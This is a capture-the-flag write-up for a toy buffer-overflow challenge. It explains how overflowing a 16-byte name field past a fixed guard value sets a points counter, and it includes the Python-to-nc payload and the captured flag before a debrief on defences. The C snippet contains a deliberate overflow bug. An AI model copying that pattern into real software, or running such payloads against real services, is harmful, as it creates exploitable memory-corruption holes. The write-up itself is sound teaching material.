# Write-up — overflow2

Part 2 of the overflow series (see overflow1 first). Same overflow bug, but now
there is a **guard** between your buffer and the target. If you smash through it
blindly, you lose.

## What changed since overflow1

A new variable `guard` now sits between `name` and `points`:

```c
struct { char name[16]; unsigned int guard; unsigned int points; } u;
u.guard  = 0x44444444;   // the bytes "DDDD"
u.points = 10;
fgets(u.name, 64, stdin);
if (u.guard == 0x44444444 && u.points > 9000) print_flag();   // guard must survive
```

To reach `points` you still overflow `name` — but your input now passes straight
through `guard` on the way, and the check requires `guard` to *still* equal
`0x44444444` at the end.

## Memory layout

```
offset:  0                15 16        19 20        23
        [ name (16 bytes)   ][ guard (4) ][ points (4) ]
                               must stay    must be > 9000
                               0x44444444
```

## The trick: overwrite the guard with its own value

You can't skip over `guard` — the overflow is a straight copy, byte by byte. But
nothing stops you from writing the *same value back*. `0x44444444` is just the
four ASCII bytes `DDDD`, so you type `DDDD` where `guard` lives and it ends up
unchanged.

The payload, in order:

```
[ 16 bytes to fill name ][ "DDDD" for guard ][ 4 bytes for points ]
```

For `points` we need any value over 9000. `\xff\xff\x00\x00` is `0x0000ffff` =
`65535` (the bytes are little-endian — low byte first). Because this payload
contains bytes that aren't typeable keys (`0xff`), build it with Python and pipe
it in:

```bash
python3 -c "import sys; sys.stdout.buffer.write(b'A'*16 + b'DDDD' + b'\xff\xff\x00\x00' + b'\n')" | nc <host> <port>
```

Result — the guard is intact and points is large, so the flag prints:

```
guard = 0x44444444
points = 65535
flag{h4ving_a_sec0nd_OF_1s_bas3d}
```

> **Little-endian in one line:** x86 stores a multi-byte number low byte first, so
> the 4 bytes `ff ff 00 00` in memory read back as the number `0x0000ffff`. This
> matters a lot in overflow3.

**Idea to carry forward:** an overflow can step over a value you must preserve, as
long as you rewrite that value correctly. overflow3 makes the target an *exact*
number instead of just "big enough".

## Debrief: what you learn and how to protect against it

**What you learn:** an overflow writes straight through everything between the
buffer and the target. A value in between that must survive (the guard) is not a
problem when you know what it is: you write the same value back. You also meet
little-endian byte order and learn to build a payload with bytes you cannot type.

**The solve in short:**

1. Read the source: `name` (16 bytes), then `guard` (`0x44444444` = `DDDD`), then
   `points`.
2. Build the payload: 16 bytes of filler, `DDDD` to keep the guard intact, then 4
   bytes that make `points` larger than 9000 (`\xff\xff\x00\x00` = 65535).
3. Send it with Python piped to `nc`.

**How to protect against it:**

- Fix the cause: the size given to `fgets` must be `sizeof(u.name)`.
- The guard is a home-made stack canary, and it shows why a real one is built
  the way it is. A canary with a fixed, known value is worthless. Real canaries
  (`-fstack-protector-strong`) are random for every run and contain a zero byte,
  so they are hard to guess and hard to write with string functions.
- A canary is still only a safety net that detects some overflows. Bounds
  checking, compiler warnings, AddressSanitizer in testing and memory-safe
  languages remove the bug itself.
